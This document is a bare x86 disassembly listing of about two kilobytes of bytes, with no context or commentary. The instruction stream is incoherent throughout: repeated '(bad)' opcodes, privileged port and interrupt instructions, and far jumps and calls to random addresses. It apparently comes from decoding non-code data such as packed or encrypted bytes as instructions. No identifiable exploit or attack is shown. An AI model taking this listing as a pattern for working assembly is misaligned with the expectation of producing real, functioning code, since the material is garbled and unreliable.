  418524:	sub    al,0x32
  418526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418527:	aam    0xe8
  418529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41852a:	mov    esp,?
  41852c:	sub    al,0x90
  41852f:	cmp    BYTE PTR [ebx+0x5e60fd4e],al
  418535:	call   0x1f76762c
  41853a:	inc    esi
  41853b:	jmp    0xff61066e
  418540:	cmp    DWORD PTR [ebp+eiz*1+0x524f8583],0x2b84d796
  41854b:	ds mov bl,bl
  41854e:	dec    esi
  41854f:	aam    0x93
  418551:	cmp    eax,0x3e98c270
  418556:	dec    edx
  418557:	pop    es
  418558:	dec    ebx
  418559:	pop    edi
  41855a:	mov    bh,0xb3
  41855c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41855d:	arpl   WORD PTR [ecx+0x16dd01c2],cx
  418563:	dec    ebx
  418564:	(bad)  [edx-0x64]
  418567:	ins    DWORD PTR es:[edi],dx
  418568:	leave  
  418569:	or     bh,BYTE PTR [edi]
  41856b:	pop    ss
  41856c:	pop    eax
  41856d:	and    ebp,edx
  41856f:	inc    ebx
  418570:	and    ecx,DWORD PTR [ebp-0x5191fe38]
  418576:	test   ebx,ecx
  418578:	into   
  418579:	(bad)  
  41857a:	fistp  DWORD PTR [esi+edx*2]
  41857d:	mov    ebp,0x353fe385
  418582:	mov    esp,0x720c052d
  418587:	mov    esp,0xe0b88b46
  41858c:	push   ds
  41858d:	mov    edi,0xb19be9e
  418592:	jl     0x418550
  418594:	je     0x41852e
  418596:	xor    eax,0x91eda97c
  41859b:	xchg   ebx,eax
  41859c:	pop    es
  41859d:	add    DWORD PTR [ecx],edx
  41859f:	fwait
  4185a0:	add    dl,ch
  4185a2:	aad    0x68
  4185a4:	add    ebp,DWORD PTR ss:[esi-0x4cfc633c]
  4185ab:	mov    ah,0x5
  4185ad:	push   edx
  4185ae:	mov    ecx,0xae475740
  4185b3:	leave  
  4185b4:	xor    DWORD PTR [eax-0x57],0xd695992c
  4185bb:	mov    ah,0x98
  4185bd:	or     eax,0xb5c28d77
  4185c2:	xchg   DWORD PTR [edx-0x153b90ba],edi
  4185c8:	push   ebx
  4185c9:	jb     0x418556
  4185cb:	dec    ebx
  4185cc:	push   ebp
  4185cd:	sub    ebp,DWORD PTR [edx+edi*8]
  4185d0:	and    al,bl
  4185d2:	dec    esi
  4185d3:	jae    0x418624
  4185d5:	mov    ds:0x857738,al
  4185da:	jb     0x41859a
  4185dc:	jp     0x41860a
  4185de:	ins    DWORD PTR es:[edi],dx
  4185df:	pop    esi
  4185e0:	ja     0x418607
  4185e2:	icebp  
  4185e3:	mov    edi,DWORD PTR [ebp+eax*2-0x5cdc2de4]
  4185ea:	sbb    BYTE PTR [edi-0xca32c8a],dh
  4185f0:	jmp    0x5b52dde0
  4185f5:	rcl    cl,0xab
  4185f8:	cmp    BYTE PTR [ebp-0x68],al
  4185fb:	lock push 0xa478186d
  418601:	mov    esp,0xcca781cc
  418606:	and    eax,0x8896152f
  41860b:	arpl   WORD PTR [eax-0x6a46a656],ax
  418611:	mov    bh,0xbc
  418613:	fs push ebp
  418615:	cli    
  418616:	in     eax,0x25
  418618:	les    esp,FWORD PTR [ebx+0x4aa878e0]
  41861e:	or     al,0x16
  418620:	nop
  418621:	shr    BYTE PTR [edi],0xf4
  418624:	(bad)  
  418625:	pop    ss
  418626:	ror    esp,cl
  418628:	inc    esi
  418629:	jnp    0x418699
  41862b:	add    ebx,eax
  41862d:	in     eax,0x2a
  41862f:	das    
  418630:	and    eax,0xb6895089
  418635:	test   al,0x7
  418637:	xchg   ecx,eax
  418638:	fisttp QWORD PTR [esi]
  41863a:	gs mov edi,0xc9291047
  418640:	sub    esi,DWORD PTR [esi+ecx*8+0x65]
  418644:	cwde   
  418645:	lea    esp,ds:0xa55cbdb
  41864b:	jg     0x41863d
  41864d:	je     0x4186c7
  41864f:	or     eax,0xb4f82ec9
  418654:	cmp    eax,0x1119e037
  418659:	lods   al,BYTE PTR ds:[esi]
  41865a:	dec    esp
  41865b:	mov    DWORD PTR [ebp-0x67],ebx
  41865e:	mov    bl,0x1a
  418660:	and    BYTE PTR [eax-0x54],0xbf
  418664:	or     al,0x0
  418666:	mov    al,0xa5
  418668:	ins    BYTE PTR es:[edi],dx
  418669:	xchg   ecx,eax
  41866a:	loopne 0x4186cf
  41866c:	sbb    eax,0x85b4baf4
  418671:	dec    esi
  418672:	pop    es
  418673:	or     eax,0xc06d01dd
  418678:	fs jnp 0x418604
  41867b:	shl    BYTE PTR [ebx+0x35],1
  41867e:	dec    ebx
  41867f:	ins    BYTE PTR es:[edi],dx
  418680:	adc    ecx,DWORD PTR [esi]
  418682:	cdq    
  418683:	jo     0x418667
  418685:	lods   eax,DWORD PTR ds:[esi]
  418686:	mov    fs,WORD PTR [esi]
  418688:	jle    0x41861b
  41868a:	sub    DWORD PTR [eax-0x558c493e],edx
  418690:	pop    edi
  418691:	dec    edi
  418692:	xchg   ebx,eax
  418693:	push   ecx
  418694:	add    eax,0xbc60d52f
  418699:	mov    WORD PTR [eax-0x28],gs
  41869c:	mov    cl,0xd
  41869e:	adc    esi,0x4fbec817
  4186a4:	dec    esi
  4186a5:	stos   BYTE PTR es:[edi],al
  4186a6:	push   ebx
  4186a7:	jl     0x4186bb
  4186a9:	jl     0x4186b9
  4186ab:	jmp    0x332e:0x55b70837
  4186b2:	shl    BYTE PTR [esi-0x72],0xbd
  4186b6:	mov    DWORD PTR [esi+0x26],ebp
  4186b9:	mov    esi,DWORD PTR [ecx]
  4186bb:	(bad)  
  4186bc:	aaa    
  4186bd:	add    DWORD PTR [edx-0x51],ecx
  4186c0:	nop
  4186c1:	or     edi,DWORD PTR [eax]
  4186c3:	mov    DWORD PTR [ecx],esi
  4186c5:	pushf  
  4186c6:	enter  0xefc3,0x84
  4186ca:	add    BYTE PTR [edi+0x57e3cdda],cl
  4186d0:	adc    BYTE PTR [ebp-0xc],bl
  4186d3:	or     eax,0x2c386393
  4186d8:	pushf  
  4186d9:	arpl   WORD PTR [edx-0x38],cx
  4186dc:	in     eax,0xe8
  4186de:	cmp    eax,DWORD PTR [ebx*2+0x6fabfd07]
  4186e5:	stos   BYTE PTR es:[edi],al
  4186e6:	xor    BYTE PTR [edi+ecx*2-0x58c6ed06],ch
  4186ed:	adc    BYTE PTR [edx-0x6c],ch
  4186f0:	lds    edi,FWORD PTR [eax]
  4186f2:	cdq    
  4186f3:	outs   dx,DWORD PTR ds:[esi]
  4186f4:	xchg   ecx,eax
  4186f5:	adc    ah,BYTE PTR [eax-0x23]
  4186f8:	outs   dx,DWORD PTR ds:[esi]
  4186f9:	in     al,0x9b
  4186fb:	and    DWORD PTR [esi-0x79],eax
  4186fe:	aaa    
  4186ff:	fadd   DWORD PTR [edi]
  418701:	mov    ebx,0xeead3c4e
  418706:	cs mov gs:0x7d08d88d,eax
  41870d:	addr16 jp 0x418787
  418710:	xor    ch,BYTE PTR [esi+esi*8]
  418713:	sbb    ch,BYTE PTR [edi-0x71]
  418716:	nop
  418717:	das    
  418718:	xor    al,0x77
  41871a:	scas   eax,DWORD PTR es:[edi]
  41871b:	rol    bh,0xe2
  41871e:	cmp    eax,0xdcc026e8
  418723:	cmp    DWORD PTR [bx+si],0xffffffef
  418727:	mov    eax,ds:0xee535fd9
  41872c:	inc    ebp
  41872d:	add    esp,DWORD PTR [edi]
  41872f:	sbb    eax,0xab9a7494
  418734:	inc    esi
  418735:	adc    edi,ebp
  418737:	or     bh,BYTE PTR [ebx+0x2c]
  41873a:	ins    DWORD PTR es:[edi],dx
  41873b:	xchg   edx,eax
  41873c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41873d:	loopne 0x4187a7
  41873f:	pop    edi
  418740:	lock out 0x29,al
  418743:	xchg   edx,eax
  418744:	jne    0x418710
  418746:	fild   DWORD PTR fs:[ebx+eax*1+0x3214301c]
  41874e:	add    eax,0xad4773b1
  418753:	jg     0x4186d7
  418755:	test   al,0x56
  418757:	mov    ecx,DWORD PTR [esi]
  418759:	mov    eax,0x32165e7b
  41875e:	jmp    0x4186e5
  418760:	loope  0x4187d4
  418762:	stc    
  418763:	sub    dh,BYTE PTR ds:0xccda3f41
  418769:	sub    ch,BYTE PTR [eax+0x7d414349]
  41876f:	mov    edi,0xeaf05508
  418774:	mov    ds:0xf413843f,eax
  418779:	scas   eax,DWORD PTR es:[edi]
  41877a:	sub    al,0x3
  41877c:	xchg   ebx,eax
  41877d:	and    bl,BYTE PTR [eax+0x32]
  418780:	jmp    0x4187ea
  418782:	cld    
  418783:	aaa    
  418784:	leave  
  418785:	jns    0x4187a2
  418787:	bound  edx,QWORD PTR [ebp+esi*1-0x24dd1bbb]
  41878e:	push   0x9d2c948c
  418793:	xor    ebp,DWORD PTR [esi]
  418795:	push   0xffffff84
  418797:	sub    dl,BYTE PTR [ebx]
  418799:	sahf   
  41879a:	stc    
  41879b:	mov    bh,0x7a
  41879d:	(bad)  
  41879e:	scas   al,BYTE PTR es:[edi]
  41879f:	jmp    0x418726
  4187a1:	xchg   edi,eax
  4187a2:	int    0x92
  4187a4:	xor    BYTE PTR [ecx+ebx*2-0x6e39370],al
  4187ab:	mov    esp,DWORD PTR [esi-0x4b]
  4187ae:	sti    
  4187af:	pushf  
  4187b0:	add    DWORD PTR [esp+edx*8],esi
  4187b3:	loopne 0x4187a4
  4187b5:	sub    edi,edx
  4187b7:	and    al,0xd6
  4187b9:	jb     0x418767
  4187bb:	pop    esi
  4187bc:	pop    eax
  4187bd:	hlt    
  4187be:	leave  
  4187bf:	xor    BYTE PTR [ecx],cl
  4187c1:	xchg   DWORD PTR [edx*4+0x5bb72b13],edi
  4187c8:	inc    esi
  4187c9:	inc    edi
  4187ca:	adc    BYTE PTR [ebp+0x6f7294d9],cl
  4187d0:	jae    0x4187a3
  4187d2:	jge    0x41884c
  4187d4:	daa    
  4187d5:	loope  0x41879d
  4187d7:	ret    0x79b7
  4187da:	in     al,dx
  4187db:	fwait
  4187dc:	inc    eax
  4187dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187df:	mov    cl,BYTE PTR [ecx+ecx*2-0x69bceb7a]
  4187e6:	xchg   ecx,eax
  4187e7:	push   ebx
  4187e8:	fs push ss
  4187ea:	das    
  4187eb:	jne    0x418837
  4187ed:	pop    esi
  4187ee:	mov    ebp,0x74504107
  4187f3:	out    0x9d,al
  4187f5:	adc    BYTE PTR [edi+0x35661e38],bh
  4187fb:	sbb    eax,0x78c1c67f
  418800:	mov    al,0x6
  418802:	pop    edx
  418803:	arpl   ax,sp
  418805:	mov    ch,0xe3
  418807:	mov    esp,0xd37ca067
  41880c:	cmp    eax,0x35ce17c3
  418811:	lahf   
  418812:	mov    al,0xd
  418814:	dec    ebx
  418815:	pop    ds
  418816:	loope  0x4187a0
  418818:	std    
  418819:	mov    ebp,0xdedd23cb
  41881e:	enter  0x432b,0xd3
  418822:	add    cl,al
  418824:	jnp    0x418858
  418826:	leave  
  418827:	jo     0x4187b3
  418829:	ja     0x4187dc
  41882b:	pop    esp
  41882c:	cmp    BYTE PTR [edi+0xc],dh
  41882f:	data16 jg 0x418853
  418832:	add    ah,BYTE PTR [edi+0x5c]
  418835:	addr16 dec edx
  418837:	mov    ds:0x7b080b0f,eax
  41883c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41883d:	test   DWORD PTR [ecx-0x41b310f8],esi
  418843:	cmp    edi,DWORD PTR [ebx-0x11]
  418846:	int    0x41
  418848:	adc    bh,BYTE PTR [ebp+0x34]
  41884b:	push   ss
  41884c:	out    0x77,eax
  41884e:	pop    ebx
  41884f:	inc    eax
  418850:	jo     0x41885b
  418852:	or     BYTE PTR [si+0x31],dl
  418856:	lea    esp,[edi-0x4b]
  418859:	rcr    ebx,1
  41885b:	sbb    ecx,eax
  41885d:	stc    
  41885e:	call   0x1f5a:0x23ebf2e4
  418865:	xchg   ebp,eax
  418866:	inc    edx
  418867:	retf   0x4d86
  41886a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41886b:	xchg   esi,eax
  41886c:	xchg   ebx,eax
  41886d:	add    dh,BYTE PTR [ebp-0x6a1aeb1d]
  418873:	fidiv  DWORD PTR [ecx-0x760fbbfd]
  418879:	in     al,dx
  41887a:	cld    
  41887b:	dec    ebp
  41887c:	cld    
  41887d:	cdq    
  41887e:	ds xor al,0xe9
  418881:	aad    0x7c
  418883:	aad    0x81
  418885:	push   ebp
  418886:	in     al,dx
  418887:	icebp  
  418888:	lods   eax,DWORD PTR ds:[esi]
  418889:	mov    ebx,0xb56af386
  41888e:	in     al,dx
  41888f:	inc    ecx
  418890:	and    BYTE PTR [eax],0x8f
  418893:	adc    BYTE PTR [ebp-0x1d],dh
  418896:	sbb    ebp,esi
  418898:	add    al,0xf
  41889a:	in     al,0xfc
  41889c:	ja     0x418871
  41889e:	rcl    DWORD PTR [ebp-0x521b7a75],cl
  4188a4:	sbb    BYTE PTR ds:0x240ad0b4,0x2a
  4188ab:	mov    ah,0x23
  4188ad:	ret    
  4188ae:	into   
  4188af:	ror    BYTE PTR [edi],0xce
  4188b2:	stc    
  4188b3:	into   
  4188b4:	call   0x6fe6:0xd5d9ec4c
  4188bb:	and    al,0x5f
  4188bd:	push   ebx
  4188be:	add    esp,ebp
  4188c0:	pusha  
  4188c1:	repz or ecx,DWORD PTR [ecx]
  4188c4:	in     al,dx
  4188c5:	js     0x418883
  4188c7:	or     edi,0xb0816811
  4188cd:	sbb    al,bh
  4188cf:	adc    eax,0xb8c5b26d
  4188d4:	jg     0x418934
  4188d6:	hlt    
  4188d7:	adc    ebp,DWORD PTR [ebx]
  4188d9:	loope  0x418956
  4188db:	mov    dl,0x56
  4188dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188de:	popf   
  4188df:	jnp    0x418916
  4188e1:	jge    0x418866
  4188e3:	ret    
  4188e4:	xor    DWORD PTR ds:0x3cb46089,edx
  4188ea:	int    0xb0
  4188ec:	add    ecx,DWORD PTR [esi+0x24536e64]
  4188f2:	sbb    ch,ch
  4188f4:	mov    esp,0x68ed164f
  4188f9:	ret    0xfdff
  4188fc:	into   
  4188fd:	fistp  WORD PTR [ebx-0x5d62f6b5]
  418903:	jb     0x4188ee
  418905:	jo     0x418904
  418907:	cmp    BYTE PTR [edi],ah
  418909:	out    0xf,eax
  41890b:	jbe    0x4188a4
  41890d:	test   eax,esi
  41890f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418910:	cmp    BYTE PTR [edx],dl
  418912:	mov    bl,0xff
  418914:	rcr    DWORD PTR [edx-0x4cf9e330],0x36
  41891b:	mov    al,ds:0xde9ffa0d
  418920:	xor    eax,0x74aa5912
  418925:	pusha  
  418926:	pop    ebp
  418927:	jns    0x4188e6
  418929:	test   eax,0xd1aa6d68
  41892e:	iret   
  41892f:	stc    
  418930:	add    edi,DWORD PTR [ebx-0xc0f7344]
  418936:	neg    DWORD PTR [edx+0x16]
  418939:	pop    ebp
  41893a:	push   edi
  41893b:	add    esp,DWORD PTR [ecx-0x68]
  41893e:	push   es
  41893f:	stc    
  418940:	add    bh,dh
  418942:	aaa    
  418943:	in     al,0x39
  418945:	adc    ah,bh
  418947:	(bad)  [edi+edx*4]
  41894a:	neg    BYTE PTR [edx-0x1e771f45]
  418950:	in     al,0xc9
  418952:	sbb    al,0xa2
  418954:	adc    eax,0xb33b007e
  418959:	stos   DWORD PTR es:[edi],eax
  41895a:	push   ebp
  41895b:	cmp    ebp,eax
  41895d:	inc    edi
  41895e:	dec    ebx
  41895f:	lods   al,BYTE PTR ds:[esi]
  418960:	jl     0x418973
  418962:	iret   
  418963:	in     al,dx
  418964:	ret    
  418965:	clc    
  418966:	pop    ds
  418967:	jns    0x418981
  418969:	test   ebx,esi
  41896b:	lock jecxz 0x41896d
  41896e:	sub    al,0xa9
  418970:	dec    BYTE PTR [edi]
  418972:	and    DWORD PTR ds:0xfcbf3cd8,0x1051a8d
  41897c:	jnp    0x4189c4
  41897e:	jge    0x41895e
  418980:	rcr    BYTE PTR [edx-0x3],1
  418983:	push   ecx
  418984:	and    BYTE PTR [edx+0x34],bl
  418987:	es nop
  418989:	repz dec esp
  41898b:	and    DWORD PTR [edx-0x4ff6f60],eax
  418991:	stos   DWORD PTR es:[edi],eax
  418992:	sbb    ebx,ebx
  418994:	and    BYTE PTR [esi],bh
  418996:	outs   dx,DWORD PTR ds:[esi]
  418997:	pop    ss
  418998:	fbstp  TBYTE PTR [esi]
  41899a:	loopne 0x418a08
  41899c:	xchg   DWORD PTR [edx-0x29],edi
  41899f:	push   cs
  4189a0:	pop    ebx
  4189a1:	jno    0x418a07
  4189a3:	inc    ebp
  4189a4:	mov    esp,0xb9df852c
  4189a9:	int    0xb8
  4189ab:	cmp    DWORD PTR [ebx-0x44b2f94b],ecx
  4189b1:	push   edx
  4189b2:	cmp    edi,esp
  4189b4:	retf   
  4189b5:	jmp    0x4a01:0x67cd6fc8
  4189bc:	push   ebx
  4189bd:	addr16 addr16 shr ebp,cl
  4189c1:	sahf   
  4189c2:	sbb    BYTE PTR [edi-0x4d],cl
  4189c5:	(bad)  
  4189c6:	not    al
  4189c8:	std    
  4189c9:	fld    QWORD PTR [ebp-0x73c8d31c]
  4189cf:	(bad)  
  4189d0:	pop    edi
  4189d1:	aaa    
  4189d2:	in     eax,dx
  4189d3:	not    ecx
  4189d5:	push   0x884dda13
  4189da:	jg     0x41895c
  4189dc:	mov    ss,WORD PTR [ecx+0x5313d42b]
  4189e2:	or     al,BYTE PTR [edi]
  4189e4:	and    BYTE PTR [edi-0x6c2fbbe5],cl
  4189ea:	outs   dx,BYTE PTR ds:[esi]
  4189eb:	mov    db3,ebp
  4189ee:	(bad)  
  4189ef:	les    edi,FWORD PTR [edi]
  4189f1:	xor    bl,al
  4189f3:	bound  edx,QWORD PTR [edx]
  4189f5:	adc    BYTE PTR [edi+edi*2+0x6f5308b0],ah
  4189fc:	xchg   esi,eax
  4189fd:	push   0x5bf390e0
  418a02:	mov    ebp,0x7387b44c
  418a07:	imul   BYTE PTR [eax+0x45717442]
  418a0d:	js     0x418a37
  418a0f:	ret    
  418a10:	in     eax,dx
  418a11:	popa   
  418a12:	out    dx,eax
  418a13:	mov    bh,0x5a
  418a15:	pop    edx
  418a16:	pop    ss
  418a17:	ja     0x418a70
  418a19:	sbb    bl,BYTE PTR [ebp+0x57]
  418a1c:	ss ins DWORD PTR es:[edi],dx
  418a1e:	out    0x64,al
  418a20:	pusha  
  418a21:	les    eax,FWORD PTR [eax+0xcb01634]
  418a27:	hlt    
  418a28:	jnp    0x418a66
  418a2a:	mov    al,ds:0xd0da896e
  418a2f:	push   0xffffffe7
  418a31:	lods   al,BYTE PTR ds:[esi]
  418a32:	ja     0x418a9b
  418a34:	xchg   esp,eax
  418a35:	cli    
  418a36:	test   eax,0xe432f6a5
  418a3b:	xchg   esp,eax
  418a3c:	je     0x418a88
  418a3e:	aas    
  418a3f:	test   BYTE PTR [eax],bl
  418a41:	out    0xc7,al
  418a43:	scas   eax,DWORD PTR es:[edi]
  418a44:	jmp    FWORD PTR [ebx-0x753f51a2]
  418a4a:	arpl   WORD PTR [eax-0x69f4e52e],si
  418a50:	sti    
  418a51:	xchg   esp,eax
  418a52:	ja     0x418a22
  418a54:	out    0x85,al
  418a56:	int3   
  418a57:	pop    esi
  418a58:	cdq    
  418a59:	mov    DWORD PTR [edi],0xca549c85
  418a5f:	enter  0xcbc8,0x4b
  418a63:	or     al,0xa4
  418a65:	sbb    al,0x27
  418a67:	sub    al,0x12
  418a69:	div    BYTE PTR [edi-0x64]
  418a6c:	pop    esp
  418a6d:	push   ebx
  418a6e:	clc    
  418a6f:	mov    dl,0x3
  418a71:	bound  edx,QWORD PTR [edi-0x74]
  418a74:	jmp    0x418a1a
  418a76:	push   esp
  418a77:	mov    al,0x8c
  418a79:	jle    0x418a14
  418a7b:	sub    ah,BYTE PTR [ebx+0x62]
  418a7e:	jmp    0x99801610
  418a83:	arpl   WORD PTR [edi+0x21],bx
  418a86:	(bad)  
  418a87:	popf   
  418a88:	ins    BYTE PTR es:[edi],dx
  418a89:	jo     0x418a19
  418a8b:	aaa    
  418a8c:	inc    ecx
  418a8d:	mov    BYTE PTR [edx+0x26],bl
  418a90:	mov    es,WORD PTR [ebx+0x4d31078c]
  418a96:	ins    DWORD PTR es:[edi],dx
  418a97:	xchg   ebp,eax
  418a98:	hlt    
  418a99:	and    al,dh
  418a9b:	stc    
  418a9c:	(bad)  
  418a9d:	sub    eax,0x46f12d7a
  418aa2:	mov    WORD PTR [ecx],fs
  418aa4:	fstp   QWORD PTR [ebx-0x61d28afe]
  418aaa:	adc    DWORD PTR [eax-0x54d2ebf3],esi
  418ab0:	iret   
  418ab1:	aas    
  418ab2:	mov    ebp,DWORD PTR [ebp+0x54325c4b]
  418ab8:	into   
  418ab9:	cmp    BYTE PTR [edx-0x42],cl
  418abc:	inc    ecx
  418abd:	mov    al,0x76
  418abf:	inc    eax
  418ac0:	push   esp
  418ac1:	repnz cmp dl,BYTE PTR [eax+0x61]
  418ac5:	es loope 0x418ac3
  418ac8:	out    dx,al
  418ac9:	call   DWORD PTR [eax+0x29]
  418acc:	push   ss
  418acd:	sub    eax,0xf7ebd437
  418ad2:	xor    eax,0xcc679647
  418ad7:	aas    
  418ad8:	bound  ebp,QWORD PTR [esi-0x14]
  418adb:	push   0xffffffc9
  418add:	popa   
  418ade:	call   DWORD PTR [ecx]
  418ae0:	xor    al,0xd3
  418ae2:	cmp    eax,0x90d1124e
  418ae7:	pop    esp
  418ae8:	mov    bl,0xae
  418aea:	cld    
  418aeb:	xchg   DWORD PTR ds:0x263fc271,ebx
  418af1:	retf   0xc7e8
  418af4:	sbb    BYTE PTR ds:0x3ef462cf,ah
  418afa:	inc    edx
  418afb:	and    BYTE PTR [ebx+0x5f],cl
  418afe:	sub    edi,DWORD PTR [ebp+0x3fa14191]
  418b04:	into   
  418b05:	fwait
  418b06:	inc    esp
  418b07:	into   
  418b08:	jo     0x418b3b
  418b0a:	ds or  dl,cl
  418b0d:	shl    BYTE PTR [edi+0x18],cl
  418b10:	dec    ecx
  418b11:	bound  ecx,QWORD PTR [ecx+0x27d04fa1]
  418b17:	in     al,dx
  418b18:	pop    edi
  418b19:	mov    dh,0xa7
  418b1c:	sub    bl,BYTE PTR ds:0xf0fa6b1b
  418b22:	xor    bl,BYTE PTR [ebx]
  418b24:	call   0xefea:0x97abce4f
  418b2b:	jno    0x418abe
  418b2d:	popa   
  418b2e:	add    esp,eax
  418b30:	shl    BYTE PTR [ecx-0xb],0x65
  418b34:	adc    esi,edi
  418b36:	(bad)  
  418b37:	std    
  418b38:	sbb    BYTE PTR [ecx],0x7
  418b3b:	push   ds
  418b3c:	jbe    0x418b29
  418b3e:	(bad)  
  418b40:	mov    ds:0xcea3474b,al
  418b45:	push   0x46
  418b47:	inc    ebx
  418b48:	(bad)  
  418b49:	daa    
  418b4a:	sbb    eax,0xf66065f9
  418b4f:	push   ecx
  418b50:	(bad)  
  418b51:	inc    ebp
  418b52:	dec    ebx
  418b53:	enter  0x5fc0,0xa5
  418b57:	fnstenv [edx]
  418b59:	int3   
  418b5a:	fsubr  DWORD PTR [ebx]
  418b5c:	fstp   QWORD PTR ds:0x29f0ecee
  418b62:	sub    esp,DWORD PTR [edx-0x45]
  418b65:	imul   ebx,esp,0x6fd1156a
  418b6b:	cdq    
  418b6c:	sbb    bl,BYTE PTR [ecx]
  418b6e:	jns    0x418b05
  418b70:	sub    al,0xe8
  418b72:	rcl    BYTE PTR [ebp-0x64],1
  418b75:	pop    edi
  418b76:	sub    cl,BYTE PTR [ebx+ebx*4]
  418b79:	(bad)  
  418b7a:	jmp    0x670092ff
  418b7f:	clc    
  418b80:	stos   BYTE PTR es:[edi],al
  418b81:	test   BYTE PTR [edx-0x1b],al
  418b84:	sbb    ah,BYTE PTR [ebp-0x64]
  418b87:	fnstcw WORD PTR [esi+0x63]
  418b8a:	mov    dl,0xe1
  418b8c:	pop    esi
  418b8d:	data16 mov bl,0x8a
  418b90:	mov    esp,0xe0206ef1
  418b95:	aas    
  418b96:	cli    
  418b97:	pop    ecx
  418b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b99:	mov    bh,0x4a
  418b9b:	or     al,0x8b
  418b9d:	int3   
  418b9e:	sub    ecx,esp
  418ba0:	fwait
  418ba1:	cli    
  418ba2:	adc    ecx,DWORD PTR [edi-0x6a]
  418ba5:	fs push 0x10
  418ba8:	jecxz  0x418bbd
  418baa:	pop    es
  418bab:	pushf  
  418bac:	test   eax,0x128fef75
  418bb1:	ins    DWORD PTR es:[edi],dx
  418bb2:	jnp    0x418bbb
  418bb4:	push   edx
  418bb5:	or     al,0x82
  418bb7:	add    DWORD PTR [eax+0x6a72ce5c],edi
  418bbd:	xlat   BYTE PTR ds:[ebx]
  418bbe:	sbb    cl,bh
  418bc0:	push   0x936d1ace
  418bc5:	push   cs
  418bc6:	xchg   esi,eax
  418bc7:	sbb    cl,BYTE PTR [ecx+0x11]
  418bca:	adc    BYTE PTR [ecx+0x10],bh
  418bcd:	xor    al,0xd5
  418bcf:	inc    BYTE PTR [edi+0x79aa41fa]
  418bd5:	out    0xd1,eax
  418bd7:	aad    0x34
  418bd9:	aad    0x22
  418bdb:	je     0x418bfa
  418bdd:	mov    edx,0x8472c0bd
  418be2:	test   al,0xee
  418be4:	pop    ds
  418be5:	mov    ch,0x3f
  418be7:	lods   eax,DWORD PTR ds:[esi]
  418be8:	in     eax,0xd4
  418bea:	stos   DWORD PTR es:[edi],eax
  418beb:	popf   
  418bec:	shr    edi,0x77
  418bef:	mov    ebp,0xeae6caad
  418bf4:	imul   esi,esi,0x675a6ecb
  418bfa:	adc    eax,eax
  418bfc:	jp     0x418c64
  418bfe:	xchg   edi,eax
  418bff:	sub    DWORD PTR [edx+0x2c493b14],esp
  418c05:	cmc    
  418c06:	mov    esp,0xe5026a75
  418c0b:	mov    ah,0x68
  418c0d:	loop   0x418c5d
  418c0f:	out    dx,al
  418c10:	sbb    eax,0x56ad0285
  418c15:	mov    dh,0x2c
  418c17:	out    dx,eax
  418c18:	jmp    0x418be8
  418c1a:	mov    BYTE PTR [eax+0x77becc0a],dh
  418c20:	mul    BYTE PTR [edx+edi*1-0x60]
  418c24:	add    eax,0x61ce8c76
  418c29:	rcl    DWORD PTR [ecx+0x16238f1a],0xf9
  418c30:	mov    ds:0x3a3a04ae,al
  418c35:	xor    eax,0x6b629c8e
  418c3a:	ins    DWORD PTR es:[edi],dx
  418c3b:	and    al,0x52
  418c3d:	cld    
  418c3e:	pop    ss
  418c3f:	sti    
  418c40:	imul   eax,DWORD PTR ss:[ebp+0xe],0xb69ba797
  418c48:	sub    BYTE PTR [ecx+0x55b32a55],ch
  418c4e:	ret    0xd15c
  418c51:	repnz icebp 
  418c53:	or     DWORD PTR [esp+ecx*4],edx
  418c56:	(bad)  
  418c57:	popa   
  418c58:	push   ebp
  418c59:	jae    0x418c43
  418c5b:	lods   al,BYTE PTR ds:[esi]
  418c5c:	mov    ecx,0x1409048
  418c61:	dec    ebx
  418c62:	inc    edi
  418c63:	jo     0x418c64
  418c65:	mov    ecx,0xaef62227
  418c6a:	adc    BYTE PTR [ebx],cl
  418c6c:	and    al,0x7b
  418c6e:	mov    esi,0x81ca0b72
  418c73:	call   0x7a406909
  418c78:	punpckhdq mm0,mm0
  418c7b:	jb     0x418c34
  418c7d:	ins    DWORD PTR es:[edi],dx
  418c7e:	pop    eax
  418c7f:	jo     0x418c5b
  418c81:	cli    
  418c82:	fimul  DWORD PTR [ebx+esi*8+0x6b]
  418c86:	jp     0x418c6a
  418c88:	fwait
  418c89:	xor    eax,0x15ac9f5c
  418c8e:	lds    eax,FWORD PTR ds:0x4aebe783
  418c94:	pushf  
  418c95:	das    
  418c96:	(bad)  
  418c97:	fimul  WORD PTR [esi+0x77]
  418c9a:	push   edx
  418c9b:	mov    DWORD PTR [eax+0x54],0xdb9b886
  418ca2:	ins    DWORD PTR es:[edi],dx
  418ca3:	ds pusha 
  418ca5:	int    0xc5
  418ca7:	mov    dh,0x2d
  418ca9:	and    eax,0x6d0f4be
  418cae:	xor    BYTE PTR [ecx-0x6f],ch
  418cb1:	stc    
  418cb2:	adc    DWORD PTR ds:0xc5ee5820,0xe4032cdb
  418cbc:	cmp    DWORD PTR [edi],ebx
  418cbe:	data16 xor ch,0xc5
  418cc2:	stos   DWORD PTR es:[edi],eax
  418cc3:	or     ebp,DWORD PTR [edi+0x76c95cfc]
  418cc9:	je     0x418c51
  418ccb:	in     al,0xe4
  418ccd:	mov    edi,0xadcd7720
  418cd2:	fadd   st(2),st
  418cd4:	cmp    DWORD PTR [ebx-0x5995a553],edx
  418cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cdb:	mov    BYTE PTR [bp+di-0x6ab8],bh
  418ce0:	iret   
  418ce1:	ficom  DWORD PTR [esi]
  418ce3:	ja     0x418cde
  418ce5:	sub    BYTE PTR ds:[eax-0x6a647f1d],ch
  418cec:	cli    
  418ced:	cmp    al,0x76
  418cef:	sti    
  418cf0:	xlat   BYTE PTR ds:[ebx]
  418cf1:	pop    esi
  418cf2:	out    0xfe,eax
  418cf4:	(bad)  
  418cf5:	adc    bl,BYTE PTR [eax]
  418cf7:	push   0xef6c5b62
  418cfc:	inc    ebp
  418cfd:	adc    dh,BYTE PTR [edx-0x3935d0d4]
  418d03:	test   eax,0x265b0a5c
